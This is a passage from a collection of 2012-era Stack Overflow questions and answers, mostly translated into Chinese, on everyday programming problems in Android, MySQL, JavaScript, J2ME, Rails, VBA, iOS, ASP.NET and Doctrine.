我的建议是将缓存存储在数据库表中，而不是内存中。如果条目被大量引用，它们*将*在内存中（在磁盘缓冲区中）。这种方法的优点是差异将与其他数据库表竞争核心位置，这总是比预分配（和管理）XXX 字节的内存更智能。

另一个优点是维护缓存条目的 {hitcount,date of access, ...} 相对容易，并且它的管理都可以在 SQL 中完成。

请记住：*磁盘空间是免费的*。在磁盘上拥有 XXX GB 缓存非常容易，并且只有效地使用了 XXX MB。重*击者*将在内存中，而*长尾*将位于磁盘上。并且总是可以增加或缩小缓存。

未缓存版本的成本估算：

*   2 个文件的 I/O + 缓冲内存成本
*   差异操作的 CPU + 内存成本
*   结果的缓冲存储器。

缓存版本的成本估算：

*   I/O + 获取差异
*   用于查询的 CPU + 内存
*   结果的缓冲存储器

如果比较两者：

*   未缓存的版本具有更大的 I/O 成本（假设 diff 小于两个文件的总和）
*   未缓存的版本总是有更大的内存占用
*   查询成本可能小于差异执行成本。或者它可以更大...

# android - 使用 sqlite 的缺点？

> ID：11806703
> 
> 赞同：1
> 
> 时间：2012-08-04T07:13:10.073
> 
> 标签：android

好吧，我想在我的应用程序上添加一些功能。我想要的是在那里放一个搜索按钮，我知道为了做到这一点，我必须将我的文本放在数据库中以使用 sql 进行查询。但是，在 android 上使用 sqlite 有缺点吗？例如，如果我必须在其中存储大文件？或者如果一个用户删除了我创建的应用程序，数据库会保留在他们的手机中吗？还有我可以在 android 上的 sqlite 上使用的最大尺寸是多少？除了使用数据库之外，还有其他替代方法吗？谢谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:45:34.720

好吧，我不确定数据库，但通常外部存储数据永远不会被删除，除非用户自己删除它。尽管在旧版本的 android 中，数据曾经在应用程序卸载时被删除。

我不确定缺点，但除了 SQLite，Android 中还有 3 个数据存储选项。一种是共享偏好，但它只满足原始数据类型，并在应用卸载时被删除。其次是内部存储器上的文件存储，在应用程序卸载时也会被删除。第三是外部存储器上的文件存储，它不会在应用程序卸载时删除，但如果存储安装在计算机上，则可以由任何其他应用程序或计算机访问。

SQLite 数据对应用程序来说是安全和私有的，我相信这是一种很好的存储方法。它的大小限制是 SQLite 的标准，请[在此处查看 SQLite 限制](http://www.sqlite.org/limits.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:23:22.230

SQLite 似乎对您来说是一个很好的解决方案。如果您打算在 DB 中搜索文本，您可以使用[FTS](http://www.sqlite.org/fts3.html)功能。我认为它支持大文件的能力[超过](http://www.sqlite.org/limits.html)了现代硬件上限:)。Sqlite 数据库是简单文件，因此您可以控制是否将其保存在用户设备上（将 db 文件放在 sdcard 上左右（强烈不推荐））或不保存（将 db 文件放入应用程序本地存储）。

如果您描述更多您的应用程序，我可以建议一些替代方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T07:24:11.053

我认为在您的应用程序中使用 sqlite 并没有什么缺点。但是有人认为您不会忘记您必须仅在后台线程中执行所有数据库操作。如果您在主线程中运行，则 UI 将在处理大数据时冻结。

如果您使用方法创建文件，也可以从 SDCard 中删除您的应用程序数据。请`getExternalStorageDirectory()`参阅下面的链接以使用该方法创建文件

[Android 如何使用 Environment.getExternalStorageDirectory()](https://stackoverflow.com/questions/5453708/android-how-to-use-environment-getexternalstoragedirectory)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T07:34:56.417

实际上，我相信这是 Sqlite 的优点之一。Sqlite 是数据库的 1 文件解决方案，可让您轻松克隆和部署。至于卸载和大小限制的删除，我无法想象为什么它会与任何其他文件不同（因为它只是一个文件）

# mysql - 无法在 Toad MySql 中创建连接

> ID：11806708
> 
> 赞同：0
> 
> 时间：2012-08-04T07:13:56.603
> 
> 标签：mysql, connection, toad

我无法创建与 Toad MySQL 的简单连接。

在创建过程中：

`Connection Type : TCP`

`User : My user name.`

我不知道我应该在这里输入哪个用户名？当我安装它时出现的用户名或我为了下载安装而输入的用户名？

`Password : Should i choose a password.`当我下载安装时，在安装过程中我不必选择密码。

```
DataBase: Does any meaning for lower cases or higher cases? 
Port : 3306
The error i got : "Unable to connect to any of the specified MySQL hosts." 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T07:23:20.600

To start connection for your Mysql Server is easy.

First when you try to do new connections you will need to choose TCP.

Then you need to fill up with these details :

```
Host: The ip address of the Mysql server

User: the username for mysql database

Password: the password for mysql database

Database: the name of the database

Port : leave this as default (3306) 
```

After that you can make your connection.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-25T13:50:44.607

更改 my.cnf 配置文件中的默认设置。

您可以在以下位置找到该文件：/etc/mysql/my.cnf

将 bind-address=127.0.0.1 更改为 bind-address=your_server_ip

重启mysql服务器然后尝试连接

[看这里](http://www.toadworld.com/products/toad-for-mysql/f/22/t/8559.aspx)

# javascript - Using JS to Measure an Image Height and use in CSS

> ID：11806710
> 
> 赞同：0
> 
> 时间：2012-08-04T07:13:57.200
> 
> 标签：javascript, css, image

I would like to set the width of a div based on the width of an image that has been scaled to fit the viewing screen.

Now, I'm not a platinum grade programmer, but from what I gather this may be done using JavaScript to measure the width of the image and then outputting that result to the CSS. However I have no clue how to do this and can't find any decent tutorials. If anyone could point me to a tutorial or another good method for achieving my end that would be lovely.

Many thanks.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:15:52.767

This is very easily done with jQuery...

`$('div').css( 'width', $('img').width() + 'px' );`

See [.width()](http://api.jquery.com/width/)

Here is a [demo](http://jsfiddle.net/Wcp9d/).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:26:02.443

In JS (no jQuery) you can use `style.width` and `offsetWidth`. For example:

```
var w = document.getElementById('img_id').offsetWidth;
document.getElementById('div_id').style.width = w + 'px';​​​​​​​​​​​​​​​​​​ 
```

Where `'img_id'` is the `id` of the `img`, and `'div_id'` is the `id` of the `div`.

JSFiddle [here](http://jsfiddle.net/p6n2B/).

# java-me - 如何在 j2me(java) 中设置图像的高度和宽度

> ID：11806711
> 
> 赞同：2
> 
> 时间：2012-08-04T07:14:17.563
> 
> 标签：java-me, lcdui

我从图像 url（lcdui 图像）创建了一个图像

```
HttpConnection c = (HttpConnection) Connector.open(imageurl);
int len = (int)c.getLength();

if (len > 0) 
{
is = c.openDataInputStream();
byte[] data = new byte[len];
is.readFully(data);

img = Image.createImage(data, 0, len); 
```

我想为此设置高度和宽度？我想显示

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T15:57:39.297

您不需要设置宽度和高度，因为在图像加载期间会加载并设置此信息。因此，如果图像是 320x100，您的代码将创建 320x100 图像。 `img.getWidth()`将返回 320。`img.getHeight()`将返回 100。

无法更改`Image`对象的宽度和高度。您可以只查询它的宽度和高度。

您的图像已准备好呈现在`ImageItem`画布中的对象中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T09:15:22.917

您**不能将宽度和高度设置**为图像。但是，您可以使用以下方法**调整图像大小。**

```
public Image resizeImage(Image src, int screenHeight, int screenWidth) {
        int srcWidth = src.getWidth();

        int srcHeight = src.getHeight();
        Image tmp = Image.createImage(screenWidth, srcHeight);
        Graphics g = tmp.getGraphics();
        int ratio = (srcWidth << 16) / screenWidth;
        int pos = ratio / 2;

        //Horizontal Resize        

        for (int index = 0; index < screenWidth; index++) {
            g.setClip(index, 0, 1, srcHeight);
            g.drawImage(src, index - (pos >> 16), 0);
            pos += ratio;
        }

        Image resizedImage = Image.createImage(screenWidth, screenHeight);
        g = resizedImage.getGraphics();
        ratio = (srcHeight << 16) / screenHeight;
        pos = ratio / 2;

        //Vertical resize

        for (int index = 0; index < screenHeight; index++) {
            g.setClip(0, index, screenWidth, 1);
            g.drawImage(tmp, 0, index - (pos >> 16));
            pos += ratio;
        }
        return resizedImage;

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-20T14:25:02.207

接受的答案对我不起作用（因为它在减小图像尺寸时在图像底部留下了一条白色带 - 尽管保持相同的纵横比）。[我在CodeRanch 论坛上](http://www.coderanch.com/t/228899/JME/Mobile/resize-image)找到了一个代码片段。

这是清理后的片段：

```
protected static Image resizeImage(Image image, int resizedWidth, int resizedHeight) {

    int width = image.getWidth();
    int height = image.getHeight();

    int[] in = new int[width];
    int[] out = new int[resizedWidth * resizedHeight];

    int dy, dx;
    for (int y = 0; y < resizedHeight; y++) {

        dy = y * height / resizedHeight;
        image.getRGB(in, 0, width, 0, dy, width, 1);

        for (int x = 0; x < resizedWidth; x++) {
            dx = x * width / resizedWidth;
            out[(resizedWidth * y) + x] = in[dx];
        }

    }

    return Image.createRGBImage(out, resizedWidth, resizedHeight, true);

} 
```

# ruby-on-rails - RoutingError 并且没有给出控制器或操作详细信息

> ID：11806714
> 
> 赞同：0
> 
> 时间：2012-08-04T07:14:46.703
> 
> 标签：ruby-on-rails, templates, routing, mailer

我有一个单独的类，它根据先决条件数据组织创建帐户的所有方面（即，如果用户已经存在，而不是创建用户，而是将此数据添加到该用户帐户）。然后这两种情况都会向用户发送一封电子邮件，通知他们为他们的帐户（新用户）提供所需的信息，或者只是通知他们 X 数据已添加到他们的帐户中。这些交易电子邮件使用 Postage App 进行管理。

在本地开发时，系统的每个方面都按预期工作，并且在每种情况下都会发送适当的电子邮件，但是在演示服务器（位于 Heroku 上）上发生了一个奇怪的问题，即抛出 RoutingError，消息为“没有路由匹配 {}”（没有列出控制器或操作）。

在 Heroku 中启动 rails 控制台后，我尝试检查这条路线并没有抛出任何错误。

以下是此过程中 Heroku 服务器日志的片段：

```
2012-08-04T01:07:09+00:00 app[web.1]:   app/views/user_mailer/new_user_email.html.haml:7:in `_app_views_user_mailer_new_user_email_html_haml___1192864641417349048_59959220'
2012-08-04T01:07:09+00:00 app[web.1]:   app/lib/user_generator.rb:70:in `send_user_email'
2012-08-04T01:07:09+00:00 app[web.1]: ActionController::RoutingError (No route matches {}):
2012-08-04T01:07:09+00:00 app[web.1]:   app/mailers/user_mailer.rb:13:in `new_user_email'
2012-08-04T01:07:09+00:00 app[web.1]:   app/controllers/details_controller.rb:62:in `finalise'
2012-08-04T01:07:09+00:00 app[web.1]:   app/lib/user_generator.rb:36:in `generate_user_details' 
```

发生这种情况后，PostageApp 然后将替代电子邮件发送到用户电子邮件地址。

控制它的代码是：

```
 def send_user_email(is_new)
    if is_new
      UserMailer.new_user_email(@user).deliver
    else
      UserMailer.confirm_details_email(@user, @details).deliver
    end 
  end 
```

我的主要问题是什么会导致 Heroku 产生这种 RoutingError （在本地运行代码时不会发生） - 在这之后，PostageApp 有什么理由会发送一个单独的模板而不是预期的模板？

* * *

编辑：发送替代电子邮件的原因是产生的 500 错误导致回调重试，导致详细信息被重新添加给用户并发送第二封电子邮件。

我现在的问题是，当调用的辅助方法在控制台中的服务器上工作时（正如它在电子邮件中显示的那样），什么可能导致发生路由错误？

# slickgrid - Slickgrid 水平滚动条覆盖最后一行

> ID：11806720
> 
> 赞同：2
> 
> 时间：2012-08-04T07:16:15.027
> 
> 标签：slickgrid

当 Slickgrid 包含在具有固定宽度的*div*中并且需要水平滚动条时，该滚动条将覆盖最后一行数据。

[http://jsfiddle.net/ericjohannsen/LtsvJ/](http://jsfiddle.net/ericjohannsen/LtsvJ/)

这怎么能解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T21:39:11.920

[在https://github.com/mleibman/SlickGrid/commit/6d3b8a0844a0ef8528b11e67ef0bd0f5265d1c7b](https://github.com/mleibman/SlickGrid/commit/6d3b8a0844a0ef8528b11e67ef0bd0f5265d1c7b)中修复。

# winapi - 为什么 BitBlt 在不同的地方有不同的结果

> ID：11806721
> 
> 赞同：0
> 
> 时间：2012-08-04T07:16:17.087
> 
> 标签：winapi, bitblt

我为 BitBlt 编写了一个测试样本，在 WinProc 中，WM_PAINT 执行此操作：它将重复从窗口 (0,0) 绘制小块到客户区。

```
 case WM_CREATE:{
          cxSource = GetSystemMetrics (SM_CXSIZEFRAME) + GetSystemMetrics (SM_CXSIZE) ;
          cySource = GetSystemMetrics (SM_CYSIZEFRAME) + GetSystemMetrics (SM_CYCAPTION) ;
          return 0 ;

      case WM_PAINT:
          hdcClient = BeginPaint (hwnd, &ps) ;
          hdcWindow = GetWindowDC (hwnd) ;
          RECT rcClient; 
          GetClientRect(hwnd, &rcClient);
          for (y = 0 ; y < rcClient.bottom ; y += cySource)
              for (x = 0 ; x < rcClient.right ; x += cxSource)
                  BitBlt (hdcClient, x, y, cxSource, cySource, hdcWindow, 0, 0, SRCCOPY) ;

          ReleaseDC (hwnd, hdcWindow) ;
          EndPaint (hwnd, &ps) ;
          return 0; 
```

但是如果我写一个函数做同样的事情并标记上面的代码，结果就是一张大图，谁能告诉我为什么？

这个示例来自编程 windows CH14 BitBlt 项目，我修改了一些。项目目标是使用window(0,0,cxSource, cySource)中的小图案来填充客户区，但是如果我在另一个函数中写这个，结果是，只有一张大图。提前致谢。

# php - 将参数返回给其他函数

> ID：11806722
> 
> 赞同：1
> 
> 时间：2012-08-04T07:16:22.367
> 
> 标签：php

当有继承时，我们可以这样做：

```
class Demo
{    
    public function doStuff(Form $form, Request $request)
    {     
        parent::doStuff($form, $request);
    }

} 
```

有没有办法将这些相同的参数注入不是父级的函数中，即：

```
//...
MyRandomClass::doStuff($form, $request);
//... 
```

如果是，合成器是什么？

干杯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:23:21.683

```
MyRandomClass::doStuff($form, $request); 
```

如果函数 doStuff() 被定义为“public static”，它将正常工作（假设 MyRandomClass 已包含/需要在这一行的上下文中）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:24:29.427

> 有没有办法在非父函数中注入这些相同的参数

你的意思是说，你想在另一个类的另一个同名函数中传递相同的参数值。

```
public function doStuff(Form $form, Request $request)
{     
    parent::doStuff($form, $request);
    MyRandomClass::doStuff($form, $request);
} 
```

上面的代码也会将参数值传递给`MyRandomClass::dostuff()`方法。请记住，该方法应该是静态的，否则它将不起作用。

# flash - 如何在 Flash 中插入 gif？

> ID：11806723
> 
> 赞同：0
> 
> 时间：2012-08-04T07:16:35.020
> 
> 标签：flash, actionscript, gif

是否可以？如果是这样，我该如何编写这样的代码？

例如，我有名为 image.gif、image2.gif、someother.gif 等的文件，这些文件都是动画 gif。

我想使用动作脚本以某种方式在 Flash 中导入它，因此动作脚本会抓取他所在文件夹中的所有 gif，并自动将它们显示在彼此下方。

问题是有可能他们在 Flash 中制作自己的动画吗？

我想为我的 gif 横幅制作一个受保护的 flash 容器。

感谢您的任何建议，我该怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:39:13.770

我推荐使用[Thibault Imbert 的 GIF 播放器库](http://www.bytearray.org/?p=95)。

![GIF 播放器](../Images/b48f4187fa7e890ee82bcb25ccd328ec.png)

遵循图书馆附带的示例/文档，它相当简单：

```
var gifImage:GIFPlayer = new GIFPlayer();
addChild ( gifImage );
gifImage.load ( new URLRequest ("animation.gif") );
gifImage.play(); 
```

大约 4 年前，我将它用于[一个 uni 项目](http://sws.canterbury.ac.uk/gp55/)，并记得它很容易上手。

关于使用，它看起来并不有趣：

1.  我想很多人都使用浏览器扩展来阻止广告或闪烁。
2.  我不确定这些 GIF 会受到怎样的保护。默认情况下，它应该很容易监控浏览器的网络活动（下载的文件）或使用任何类型的 swf 反编译器或只是 gif 的路径。我想有可能编写一个图像加扰器，它会在加载到服务器之前转换你的 .gif，在 swf 中你会使用代码来解扰图像，但你还需要加扰 actionscript 代码。会使这项任务变得更加困难，但并非不可能。总体而言，对于像 gif 横幅这样“令人兴奋”的东西来说，这听起来有点矫枉过正。

# c++ - WinHttp - 指定一次处理的最大请求数的选项

> ID：11806724
> 
> 赞同：1
> 
> 时间：2012-08-04T07:16:54.237
> 
> 标签：c++, windows, networking, winhttp

我用

```
DWORD totalReq = 400;    
::WinHttpSetOption(sessionHandle, WINHTTP_OPTION_MAX_CONNS_PER_SERVER, &totalReq, sizeof(totalReq)); 
```

为了限制我在某个时候可以向给定服务器发出的未完成请求的总数。我想要完成的是限制我的应用程序中的组件发出过多请求的可能性（它们是向同一台服务器发出的），否则我会遇到 winhttp 的内存问题（内存在 winhttp.dll 中建立）

有没有办法使用 API 来实现这一点？否则我将不得不自己实施。我观察到的关于 WINHTTP_OPTION_MAX_CONNS_PER_SERVER 的情况是，确实可以实现该数量的并发请求/服务器，但这并没有阻止客户端代码成功发出请求（并在 winhttp 中构建该请求以供以后发送）

# android - 使用来自另一个 Activity 的 WHERE 子句执行 rawquery 以接收表值

> ID：11806725
> 
> 赞同：0
> 
> 时间：2012-08-04T07:17:06.117
> 
> 标签：android

我在 SQLiteDatabase 中遇到问题。我想从另一个 Activity 访问在一个 Activity 中创建的数据库表。但是，当我使用 WHERE 子句时，查询没有执行。我指的是 CropInfoListclass 中的 sambleDB。

这是一些代码。

```
String[] item = {getIntent().getExtras().getString("item")};

Cursor c = CropInfoList.sampleDB.rawQuery("SELECT * FROM "+ TableName +" WHERE "+ name +"=?", item);

String Name = c.getString(c.getColumnIndex("name"));
String Type = c.getString(c.getColumnIndex("type")); 
```

# c++ - 模板类中的“静态”模板类——封装、继承还是……？

> ID：11806729
> 
> 赞同：1
> 
> 时间：2012-08-04T07:17:30.230
> 
> 标签：c++, templates, static

我有一个类似于以下的“静态”模板类：

```
#include <cstddef>

template <size_t elem_size>
struct StaticClass
{
    static void* priv;
}; 
```

因此，该类仅包含静态成员。正如静态模板所暗示的那样，`priv`每个`elem_size`.

我也有已经从另一个类继承的主模板类：

```
template <class T>
class MainBase
{
    // types, methods...
};

template <class T>
class MainDerived : public MainBase<T>
{
    // members, methods...
}; 
```

现在，我希望`MainDerived`能够访问`StaticClass<sizeof(T)>`；这意味着`T`相同大小的不同类型将访问相同的变量。**这样做的最佳方法是什么？**我主要考虑内存占用。

AFAICS，具有非静态`StaticClass<sizeof(T)>`成员`MainDerived`将类大小增加 1（对于“静态”类的大小为 1）。

所以我正在考虑三种方法中的任何一种：

1.  继承自`StaticClass`（然后是多重继承），
2.  定义类型的静态成员`StaticClass`，
3.  直接访问`StaticClass<sizeof(T)>`方法。

所有三种方法都将产生相似的源代码（需要以一种或另一种方式明确说明类），并且它们都不会影响`sizeof(MainDerived<T>)`. 我想知道其中是否有我应该注意的其他含义。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T09:21:32.220

我看到了与标准库的字符串类的相似之处，它（实际上）有一个用于具有所有静态成员的助手类的 typedef，比如

```
typedef std::char_traits<T>   traits_type; 
```

然后在其余代码中使用`traits_type::copy`,`traits_type::assign`等。

你可以用你的`StaticClass`.

```
typedef StaticClass<sizeof(T)>   sc; 
```

然后用于`sc::priv`访问每个类的正确指针。

# excel - 用于遍历工作表并将特定数据复制到特定单元格的 VBA 代码

> ID：11806731
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:17:39.497
> 
> 标签：excel, vba

示例工作簿链接： http: [//www.wikisend.com/download/245286/MIS%20-%20July%20%20 (1).xlsm](http://www.wikisend.com/download/245286/MIS%20-%20July%20%20(1).xlsm)

该工作簿具有 vba 代码，该代码删除所有工作表，然后通过从其他工作簿复制工作表来创建新工作表。

我想要另一个 vba 代码自动生成包含所有格式和数据的执行摘要表。一些公式定义不明确，因此以后必须手动编辑它们。由于其他工作表每个月都会更改，因此手动引用会很乏味

我当前的代码：

```
 Sub WorksheetLoop()

        Sheets.Add After:=Sheets(Sheets.Count)
        Sheets(Sheets.Count).Select
        Sheets(Sheets.Count).Name = "Executive Summary"

        Sheets("Executive Summary").Select
'Some formatting code on sheet Executive Summary

    Dim ws As Worksheet
       ' Begin the loop.
currentRow=6 'start entering data from row 6
     For Each ws In ThisWorkbook.Worksheets

'Assign cell at row=current row and col B reference to cell G5 at sheet ws
'Assign cell at row=current row and col F reference to cell J15 at sheet ws

'Assign cell at row=current row and col H reference to cell T5 at sheet ws

'increment Current row by 1
    'don't know what to do here    
    Next ws

'select entire region( all filled cells)
'format text, add border etc

    End Sub 
```

请告诉我引用的语法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T08:57:34.793

解决了问题

```
Sub test()

    Sheets("Executive Summary").Select
    Range("A6:P23").Select
    Range("P6").Activate
    Selection.ClearContents
    'Dim ws As Worksheet
    Dim Row As Integer
    Row = 6
    For Each ws In ThisWorkbook.Worksheets
     If ws.Name <> "Executive Summary" Then
        Range("A" & Row).Value = "='" & ws.Name & "'!C3"
        Range("B" & Row).Value = "='" & ws.Name & "'!G5"
        Range("C" & Row).Value = "='" & ws.Name & "'!G39"
        Range("D" & Row).Value = "='" & ws.Name & "'!H39"
        Range("E" & Row).Value = "=D" & Row & "-C" & Row
        Range("F" & Row).Value = "=IF(A" & Row & "=" & Chr(34) & "POWER" & Chr(34) & ",+E" & Row & "*B" & Row & ",+E" & Row & "*B" & Row & "/100)"
        Range("G" & Row).Value = "=IF(A" & Row & "=" & Chr(34) & "POWER" & Chr(34) & ",+(J" & Row & "-D" & Row & ")*B" & Row & ",+(J" & Row & "-D" & Row & ")*B" & Row & "/100)"
        '"=(J" & Row & "-D" & Row & ")*B" & Row & "/100"
        Range("H" & Row).Value = "=I" & Row & "-F" & Row & "-G" & Row
        Range("I" & Row).Value = 0
        Range("J" & Row).Value = "='" & ws.Name & "'!I39"
        Range("K" & Row).Value = "='" & ws.Name & "'!L5"
        Range("L" & Row).Value = "='" & ws.Name & "'!K39"
        Range("M" & Row).Value = "=G" & Row
        Range("N" & Row).Value = "=O" & Row & "-L" & Row & "-M" & Row
        Range("O" & Row).Value = "=I" & Row
        Range("P" & Row).Value = "='" & ws.Name & "'!M39"
        Row = Row + 1
     End If

     Next ws

End Sub 
```

# objective-c - Obejct-C / Xcode 无法在 UITextView 中添加/更改文本

> ID：11806734
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:18:18.713
> 
> 标签：objective-c, uitextview

出于某种原因，我无法从代码中更改或添加我的 UITextView 中的文本。

我已经制作了 Outlet 并已连接（全部在 IB 中） - 没有任何反应。甚至尝试添加 -setNeedsDisplay 我需要设置一些属性吗？- 这让我快疯了....

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController <UITextViewDelegate> {
    UITextView *textInfoView;
}

@property (nonatomic, retain) IBOutlet UITextView *textInfoView;

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    textInfoView.text = @"Test";
}

-(void)viewDidAppear:(BOOL)animated{
    textInfoView.text = @"Test";    
    textInfoView.text = [textInfoView.text stringByAppendingString:@"Line2"];
    [textInfoView setNeedsDisplay]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:56:54.883

看起来，很奇怪，这段代码没有更新 UITextView 中的文本。我已经尝试过，它对我有用...我认为您没有正确链接界面生成器中的 Outlet，或者您没有将您的视图控制器与您的视图相关联...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:15:41.850

UPS - 明白了……

忘了@synthesize...

出于某种原因，我在 Xcode 4.4 中没有收到警告或“setter error”，也许是版本错误？

# asp.net - EditItemTemplate 值未正确读取

> ID：11806735
> 
> 赞同：0
> 
> 时间：2012-08-04T07:18:36.743
> 
> 标签：asp.net, linq-to-sql, gridview

我正在尝试构建一个简单的`GridView`. 我有一张`Products`桌子，它包含`ProductID`and `ModelName`。我`LINQ`习惯于`SQL`

我的`GridView`代码是

```
<asp:GridView ID="GridView1" runat="server" DataSourceID="objData" AutoGenerateColumns="false" AutoGenerateEditButton="true" DataKeyNames="ProductID,ModelName">
    <Columns>
        <asp:TemplateField HeaderText="Product ID">
            <ItemTemplate>
                <asp:Label runat="server" Text='<%#Eval("ProductID") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Model Name">
            <ItemTemplate>
                <asp:Label ID="Label1" runat="server" Text='<%#Eval("ModelName") %>'/>
            </ItemTemplate>
            <EditItemTemplate>
                <asp:TextBox runat="server" Text='<%#Eval("ModelName") %>'/>
            </EditItemTemplate>
        </asp:TemplateField>
    </Columns>

</asp:GridView> 
```

我的`datasource`代码是

```
<asp:ObjectDataSource ID="objData" runat="server" SelectMethod="GetAll" UpdateMethod="UpdateProduct" 
        DataObjectTypeName="TestLINQProto.tblProduct" TypeName="TestLINQProto.ProductsList"></asp:ObjectDataSource> 
```

我的`update`方法是这样写的

```
[DataObjectMethod(DataObjectMethodType.Update,true)]
        public void UpdateProduct(tblProduct product)
        {
            EshopDataAccess.UpdateProduct(product);//This will call a LINQ function to update the product
        } 
```

问题在于`tblProduct`包含`UpdateProduct`原始值。它没有得到更新的值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:43:24.317

我认为问题在于您使用的`Eval`方法仅支持读取/获取数据。`Bind`在您的网格 aspx 代码中使用方法。像这样

```
<asp:GridView ID="GridView1" runat="server" DataSourceID="objData" AutoGenerateColumns="false" AutoGenerateEditButton="true" DataKeyNames="ProductID,ModelName">
<Columns>
    <asp:TemplateField HeaderText="Product ID">
        <ItemTemplate>
            <asp:Label runat="server" Text='<%#Eval("ProductID") %>'/>
        </ItemTemplate>
    </asp:TemplateField>
    <asp:TemplateField HeaderText="Model Name">
        <ItemTemplate>
            <asp:Label ID="Label1" runat="server" Text='<%#Eval("ModelName") %>'/>
        </ItemTemplate>
        <EditItemTemplate>
            <asp:TextBox runat="server" Text='<%#Bind("ModelName") %>'/>
        </EditItemTemplate>
    </asp:TemplateField>
</Columns>

</asp:GridView> 
```

# symfony - 在 Symfony 2/Doctrine 2 中使用 MappedSuperclass 不持久的字段？

> ID：11806736
> 
> 赞同：4
> 
> 时间：2012-08-04T07:18:38.447
> 
> 标签：symfony, doctrine-orm, symfony-forms

答`MappedSuperclass`：

```
/** @ORM\MappedSuperclass */
abstract class AbstractMessage
{
    /** @ORM\Column(type="text", nullable=true) */
    protected $content;
} 
```

还有一个子类，重新定义`$content`以添加一些自定义验证断言：

```
/** @ORM\Entity */
class InternalMessage extends AbstractMessage
{
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /**
     * @Assert\NotBlank(message="Internal message title is required.")
     */
    protected $content;

    /** @return integer */
    public function getId() { return $this->id; }

    /**
     * @param string $content
     * @return InternalMessage
     */
    public function setContent($content)
    {
        $this->content = $content;
        return $this;
    }

    /** @return string */
    public function getContent() { return $this->content; }
} 
```

# 当`$content`覆盖父级时

在我的例子中，`$content`是不持久的！`null`场地...

# `$content`从孩子身上移除

如果我`$content`从`InternalMessage`字段中删除是持久的，而验证不再起作用。

这是一个错误还是什么？我打开了一个[问题](https://github.com/symfony/symfony/issues/5156)，但不知道它是否是正确的地方（我对 github 的工作方式不熟悉）。

太糟糕了，我意识到 Doctrine 继承是错误的（从生成器本身开​​始......）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-24T16:50:11.550

Afaik，这是做不到的，Doctrine2 继承策略不允许您从`MappedSuperClass`.

这应该是反射系统的限制。

最好的办法是提取验证配置并将其移动到独立文件`XML`或`YML`文件中。

您可能还想为您的 ORM 执行此操作（但您需要为 Bundle 中的所有实体执行此操作），因为它可以让您更加灵活。

# objective-c - 使用 UIScrollView 进行 UILabel 缩放

> ID：11806741
> 
> 赞同：0
> 
> 时间：2012-08-04T07:19:53.540
> 
> 标签：objective-c, xcode, uiscrollview, uilabel, scale

我有一个`UIScrollView`显示和图像，它可以很好地滚动和一切。我想要做的是添加一个`UILabel`来`UIScrollView`显示图像的标题。我设法做到了，但是当我缩小时`UILabel`，滚动视图不会缩放并保持在屏幕上的同一位置。我将如何使标签与滚动视图图像一起缩放？这是我的代码：

```
[super viewDidLoad];
// Do any additional setup after loading the view.

self.scrollView.delegate = self;

//This just creates a image from a URL
NSURL * photoURL = [FlickrFetcher urlForPhoto:self.photoCellName format:2];
NSData * photoData = [NSData dataWithContentsOfURL:photoURL];
self.imageView.image = [UIImage imageWithData:photoData];

//Setting up scroll View
self.scrollView.contentSize= self.imageView.image.size;
self.imageView.frame = CGRectMake(0, 0, self.imageView.image.size.width, self.imageView.image.size.height);

NSLog(@"Name = %@", [self.photoCellName valueForKeyPath:@"description._content"]);
//Assigning title to the label
self.textLabel.text = [self.photoCellName objectForKey:@"title"]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T09:13:32.443

确保 label 是滚动视图的子视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T09:05:51.483

我猜你提供`UIImageView`的视图将通过`UIScrollView`在`UIScrollViewDelegate`.

**如果没有，我不确定你的缩放是如何工作的**。如果您提供它，则必须返回一个`UIView`包含您`UILabel`和您的子视图的 a，`UIImageView`并且**您必须手动将转换应用于`UIView`调整它的大小。**

[我想在这个 SO 线程](https://stackoverflow.com/questions/8873876/resize-uilabel-correct-on-top-of-uiimageview)中回答了一个类似的问题，并且**Dimme（回答它的那个）提供了一个完整的源代码解决方案，**希望它有所帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T20:44:51.547

您应该检查是否设置`autoresizingMask`了 UILabel 的属性

```
self.label.autoresizingMask = (UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight); 
```

你也可以在 IB 中做到这一点。然后，如果您要更改其父视图的框架，则标签的框架将在`- (void)setNeedsLayout`处理过程中更新

...并且不要阻止从 url 中创建图像的主线程`- (void)viewDidLoad`！

# android - 如何创建按钮来控制背景声音。

> ID：11806745
> 
> 赞同：0
> 
> 时间：2012-08-04T07:20:47.707
> 
